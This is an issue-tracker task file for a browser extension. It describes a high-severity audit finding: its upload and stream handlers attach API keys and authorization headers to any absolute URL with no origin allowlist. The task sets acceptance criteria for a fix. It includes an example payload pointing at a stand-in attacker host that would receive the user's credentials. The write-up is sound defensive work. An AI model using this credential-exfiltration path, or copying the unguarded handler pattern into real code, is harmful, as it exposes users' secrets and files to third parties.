---
id: TASK-12095
title: Add URL allowlist before attaching credentials in extension upload/stream handlers
status: Done
labels:
- bug
- high
- security
- extension
- packages-ui
documentation:
- apps/FRONTEND_AUDIT.md
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
**Severity: High (credential exfiltration primitive).** From the 2026-07-02 frontend audit (finding H3), independently flagged by two reviewers.

The background proxy's `tldw:upload` handler (`apps/packages/ui/src/entries/background.ts:1055-1073,1143-1168`) and `tldw:stream` port handler (`:3234-3257`) treat any `path` starting with `http` as an absolute URL and unconditionally attach `X-API-KEY`/`Authorization`/`X-TLDW-Org-Id`, then `fetch(url)` — with **no origin allowlist and no cross-origin auth suppression**.

This is asymmetric with the normal request path, which DOES gate it: `request-core.ts:248` (`absoluteOriginAllowlistFromConfig`), `:363` (`shouldSkipAuth = noAuth || (isAbsolute && !sameOriginAbsoluteUrl)`), `:387`. Verified: `background.ts:3235` is just `path.startsWith("http")` with no allowlist call.

A caller posting `{ path: "https://attacker.example/x" }` sends the user's API key/bearer (and, for upload, the file) to the attacker origin. Reachability is limited because `externally_connectable` is unset (verified) — so it requires an extension-context caller such as a buggy/compromised content script (which run on every `http(s)` page via the broadly-matched copilot/web-clipper scripts). Message handlers also don't validate `sender.id`.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 The `tldw:upload` and `tldw:stream` handlers apply the same absolute-URL origin allowlist + `shouldSkipAuth` cross-origin check used by `request-core.ts` before attaching credentials.
- [ ] #2 Requests to non-allowlisted absolute origins either are blocked or are sent without auth headers (matching the request-path behavior).
- [ ] #3 Privileged background message/port handlers validate `sender.id === browser.runtime.id` (defense-in-depth against a compromised content script).
- [ ] #4 A test asserts an upload/stream to a non-allowlisted absolute URL does not carry `X-API-KEY`/`Authorization`.
<!-- AC:END -->

## Implementation Notes

<!-- SECTION:IMPLEMENTATION_NOTES:BEGIN -->
<!-- SECTION:IMPLEMENTATION_NOTES:END -->
